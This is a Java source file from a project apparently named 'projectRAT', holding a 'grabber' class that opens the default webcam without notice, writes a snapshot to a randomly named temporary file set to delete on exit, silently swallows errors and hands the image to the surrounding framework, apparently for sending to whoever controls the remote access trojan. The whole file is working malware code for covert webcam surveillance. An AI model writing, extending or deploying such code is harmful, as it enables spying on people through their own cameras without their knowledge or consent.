package in.momin5.projectRAT.request.grabbers;

import com.github.sarxos.webcam.Webcam;
import in.momin5.projectRAT.request.Request;

import javax.imageio.ImageIO;
import java.io.File;
import java.util.Random;

public class WebcamCapture implements Request {

    File file;

    @Override
    public void init() throws Exception {
        try {
            file = new File(System.getProperty("java.io.tmpdir") + "/" + new Random().nextInt() + ".png");
            if(!file.exists())
                file.createNewFile();
            file.deleteOnExit();

            Webcam webcam = Webcam.getDefault();
            webcam.open();
            ImageIO.write(webcam.getImage(), "PNG", file);
        }catch (Exception e){
            //gello
        }
    }

    @Override
    public String getMessage() {
        return null;
    }

    @Override
    public File[] getFiles() {
        return new File[]{
                file
        };
    }
}
